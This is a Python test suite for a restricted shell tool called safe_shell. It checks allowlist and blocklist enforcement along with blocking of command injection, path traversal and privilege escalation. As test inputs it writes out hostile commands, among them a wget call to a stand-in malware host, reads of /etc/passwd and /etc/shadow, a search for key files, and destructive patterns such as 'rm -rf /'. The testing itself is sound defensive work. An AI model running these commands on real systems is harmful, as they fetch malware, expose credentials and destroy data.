"""Tests for yui.tools.safe_shell — AC-03."""

import shlex
import subprocess
from pathlib import PurePosixPath
from unittest.mock import MagicMock, patch

import pytest

from yui.tools.safe_shell import create_safe_shell

pytestmark = pytest.mark.component



ALLOWLIST = ["ls", "cat", "grep", "find", "python3", "git"]
BLOCKLIST = [
    "rm -rf /",
    "rm -rf ~",
    "rm -rf $HOME",
    "sudo",
    "git push --force",
    "git push -f",
    "git reset --hard",
    "chmod 777",
]


class TestSafeShellValidation:
    """AC-03: Shell commands via safe_shell with allowlist enforcement.

    These tests validate the allowlist/blocklist logic WITHOUT invoking
    actual subprocess commands.
    """

    def _make_shell(self):
        return create_safe_shell(
            allowlist=ALLOWLIST,
            blocklist=BLOCKLIST,
            timeout=10,
        )

    @patch("subprocess.run")
    def test_allowed_command_passes(self, mock_run):
        """Allowed command → delegates to subprocess."""
        mock_run.return_value = MagicMock(
            stdout="file1.txt\nfile2.txt", stderr="", returncode=0
        )
        shell = self._make_shell()
        result = shell(command="ls -la")
        mock_run.assert_called_once_with(
            "ls -la", shell=True, capture_output=True, text=True, timeout=10
        )
        assert "file1.txt" in result

    @patch("subprocess.run")
    def test_path_based_command_allowed(self, mock_run):
        """/usr/bin/cat → base name 'cat' is in allowlist (safe path)."""
        mock_run.return_value = MagicMock(
            stdout="content", stderr="", returncode=0
        )
        shell = self._make_shell()
        # /etc/ is a sensitive path and will be blocked by CWE-22 check
        # Use a safe non-sensitive path instead
        result = shell(command="/usr/bin/cat /tmp/testfile.txt")
        mock_run.assert_called_once()

    @patch("subprocess.run")
    def test_homebrew_path_allowed(self, mock_run):
        """/opt/homebrew/bin/python3 → 'python3' in allowlist."""
        mock_run.return_value = MagicMock(
            stdout="Python 3.13", stderr="", returncode=0
        )
        shell = self._make_shell()
        result = shell(command="/opt/homebrew/bin/python3 --version")
        mock_run.assert_called_once()

    def test_blocked_command_rejected(self):
        """Blocklisted patterns → error, never calls subprocess."""
        shell = self._make_shell()
        for blocked_cmd in [
            "rm -rf /",
            "rm -rf ~",
            "sudo apt install something",
            "git push --force origin main",
            "chmod 777 /etc",
        ]:
            result = shell(command=blocked_cmd)
            assert "blocked" in result.lower() or "Error" in result, \
                f"Should block: {blocked_cmd}"

    def test_command_not_in_allowlist_rejected(self):
        """Command not in allowlist → error."""
        shell = self._make_shell()
        result = shell(command="nc -l 8080")
        assert "not in the allowlist" in result

    def test_empty_command_rejected(self):
        """Empty command → error."""
        shell = self._make_shell()
        result = shell(command="")
        assert "empty" in result.lower() or "Error" in result

    def test_malformed_quoting_rejected(self):
        """Malformed shell quoting → error (not fallback to naive split)."""
        shell = self._make_shell()
        result = shell(command="ls 'unterminated")
        assert "parse" in result.lower() or "Error" in result

    @patch("subprocess.run")
    def test_nonzero_exit_code_reported(self, mock_run):
        """Non-zero exit code is included in output."""
        mock_run.return_value = MagicMock(
            stdout="", stderr="No such file", returncode=1
        )
        shell = self._make_shell()
        result = shell(command="cat nonexistent.txt")
        assert "exit code: 1" in result

    @patch("subprocess.run", side_effect=subprocess.TimeoutExpired("ls", 10))
    def test_timeout_handled(self, mock_run):
        """Timeout → error message."""
        shell = self._make_shell()
        result = shell(command="ls -la")
        assert "timed out" in result


class TestBlocklistCoverage:
    """Verify blocklist covers critical dangerous patterns."""

    @pytest.mark.parametrize("pattern", [
        "rm -rf /",
        "rm -rf ~",
        "rm -rf $HOME",
        "sudo",
        "git push --force",
        "git push -f",
        "git reset --hard",
        "chmod 777",
    ])
    def test_dangerous_patterns_blocked(self, pattern):
        """Each dangerous pattern should be in BLOCKLIST."""
        assert pattern in BLOCKLIST


class TestAllowlistExtraction:
    """Verify base command extraction logic."""

    @pytest.mark.parametrize("cmd,expected_base", [
        ("ls -la", "ls"),
        ("/usr/bin/cat foo", "cat"),
        ("/opt/homebrew/bin/grep pattern", "grep"),
        ("python3 -c 'print(1)'", "python3"),
        ("git status", "git"),
    ])
    def test_base_name_extraction(self, cmd, expected_base):
        """PurePosixPath extracts correct base name."""
        parts = shlex.split(cmd)
        base = PurePosixPath(parts[0]).name
        assert base == expected_base


# ──────────────────────────────────────────────
# Issue #58: セキュリティ攻撃パターンテスト
# OWASP Top 10 / CWE-78 (OS Command Injection) ベース
# ──────────────────────────────────────────────

@pytest.fixture
def shell():
    """safe_shell インスタンス（Issue #58用）。"""
    return create_safe_shell(
        allowlist=["ls", "cat", "grep", "find", "python3", "git"],
        blocklist=[
            "rm -rf /", "rm -rf ~", "rm -rf $HOME",
            "sudo", "git push --force", "git push -f",
            "git reset --hard", "chmod 777",
        ],
        timeout=10,
    )


@pytest.mark.security
class TestCommandInjectionBlocked:
    """CWE-78: OS Command Injection攻撃パターンの検出テスト。

    shell=True環境でのセミコロン、パイプ、コマンド置換等の
    インジェクションが適切にブロックされることを検証する。
    """

    def test_semicolon_injection_is_blocked(self, shell):
        """セミコロンによるコマンド連結インジェクション（ls; rm -rf /tmp）。"""
        result = shell("ls; whoami")
        assert "Error" in result, f"Semicolon injection should be blocked, got: {result}"

    def test_pipe_injection_is_blocked(self, shell):
        """パイプを使った出力リダイレクトインジェクション（ls | sh）。"""
        result = shell("ls | cat /etc/passwd")
        assert "Error" in result, f"Pipe injection should be blocked, got: {result}"

    def test_command_substitution_backtick_blocked(self, shell):
        """バッククォートによるコマンド置換インジェクション。"""
        result = shell("ls `whoami`")
        assert "Error" in result, f"Backtick command substitution should be blocked, got: {result}"

    def test_command_substitution_dollar_blocked(self, shell):
        """$()によるコマンド置換インジェクション。"""
        result = shell("ls $(id)")
        assert "Error" in result, f"$() command substitution should be blocked, got: {result}"

    def test_double_ampersand_injection_is_blocked(self, shell):
        """&&による条件付きコマンド連結インジェクション。"""
        result = shell("ls && whoami")
        assert "Error" in result, f"&& injection should be blocked, got: {result}"

    def test_background_execution_injection_is_blocked(self, shell):
        """`&`によるバックグラウンド実行インジェクション。"""
        result = shell("ls & wget http://evil.example.com/malware")
        assert "Error" in result, f"Background execution injection should be blocked, got: {result}"

    def test_newline_injection_is_blocked(self, shell):
        """改行文字によるコマンド境界インジェクション。"""
        result = shell("ls\nwhoami")
        assert "Error" in result, f"Newline injection should be blocked, got: {result}"

    def test_or_operator_injection_is_blocked(self, shell):
        """`||`によるOR条件インジェクション。"""
        result = shell("ls_nonexistent || cat /etc/passwd")
        assert "Error" in result, f"|| injection should be blocked, got: {result}"


@pytest.mark.security
class TestPathTraversalBlocked:
    """CWE-22: パストラバーサル攻撃パターンの検出テスト。"""

    def test_cat_etc_passwd_is_blocked(self, shell):
        """`cat /etc/passwd` — catはallowlist通過だが機密パスをブロック。"""
        result = shell("cat /etc/passwd")
        assert "Error" in result, f"cat /etc/passwd should be blocked, got: {result}"

    def test_cat_etc_shadow_is_blocked(self, shell):
        """`cat /etc/shadow` — パスワードハッシュファイルへのアクセスをブロック。"""
        result = shell("cat /etc/shadow")
        assert "Error" in result, f"cat /etc/shadow should be blocked, got: {result}"

    def test_cat_dotdot_traversal_is_blocked(self, shell):
        """相対パストラバーサル `cat ../../etc/passwd`。"""
        result = shell("cat ../../etc/passwd")
        assert "Error" in result, f"Path traversal should be blocked, got: {result}"

    def test_grep_sensitive_path_is_blocked(self, shell):
        """`grep -r password /etc` — grepはallowlist通過だが機密ディレクトリ探索をブロック。"""
        result = shell("grep -r password /etc")
        assert "Error" in result, f"Sensitive path grep should be blocked, got: {result}"

    def test_find_sensitive_path_is_blocked(self, shell):
        """`find / -name *.key` — 全ファイルシステム探索をブロック。"""
        result = shell("find / -name '*.key'")
        assert "Error" in result, f"find / traversal should be blocked, got: {result}"


@pytest.mark.security
class TestPrivilegeEscalationBlocked:
    """CWE-269: 権限昇格攻撃パターンの検出テスト。"""

    def test_python3_exec_injection_is_blocked(self, shell):
        """`python3 -c "import os; os.system(...)"` — python3はallowlist通過だがコード実行をブロック。"""
        result = shell('python3 -c "import os; os.system(\'whoami\')"')
        assert "Error" in result, f"python3 exec injection should be blocked, got: {result}"

    def test_git_arbitrary_command_is_blocked(self, shell):
        """`git --exec-path=... commit` — git経由の任意コマンド実行をブロック。"""
        result = shell("git --exec-path=/tmp commit")
        assert "Error" in result, f"git exec-path injection should be blocked, got: {result}"


@pytest.mark.security
class TestBlocklistEdgeCases:
    """既存ブロックリストの境界値・バイパステスト。"""

    def test_rm_rf_with_different_target_varies(self, shell):
        """`rm -rf /tmp` — ブロックリスト `rm -rf /` にはマッチしないため通る可能性を記録。

        Issue #58: これはブロックリスト方式の既知の限界を文書化するテスト。
        """
        # rm itself is not in allowlist, so this should be blocked by allowlist check
        result = shell("rm -rf /tmp")
        assert "Error" in result, "rm should be blocked (not in allowlist)"

    def test_sudo_substring_in_command_is_blocked(self, shell):
        """`sudo ls` はブロックリストの `sudo` サブストリングでブロック。"""
        result = shell("sudo ls")
        assert "Error" in result, f"sudo should be blocked, got: {result}"
        assert "blocked" in result.lower() or "security" in result.lower()

    def test_empty_command_is_rejected(self, shell):
        """空コマンドはエラー。"""
        result = shell("")
        assert "Error" in result, f"Empty command should be rejected, got: {result}"

    def test_whitespace_only_command_is_rejected(self, shell):
        """空白のみのコマンドはエラー。"""
        result = shell("   ")
        assert "Error" in result, f"Whitespace-only command should be rejected, got: {result}"

    def test_home_env_var_in_command_is_blocked(self, shell):
        """`$HOME` 環境変数展開をブロック（意図的仕様）。

        Issue #58: $HOMEを含むコマンドは CWE-22 チェックでブロックされる。
        これは意図的な設計 — 環境変数展開は shell=True 実行時に
        任意パスを指定する攻撃ベクターになり得るため全てブロックする。
        通常のホームディレクトリアクセスは絶対パス（/home/user/）で代替可能。
        """
        result = shell("ls $HOME/Documents")
        assert "Error" in result, f"$HOME expansion should be blocked, got: {result}"
        assert "path" in result.lower() or "traversal" in result.lower() or "sensitive" in result.lower(),             f"Should indicate path/traversal error, got: {result}"
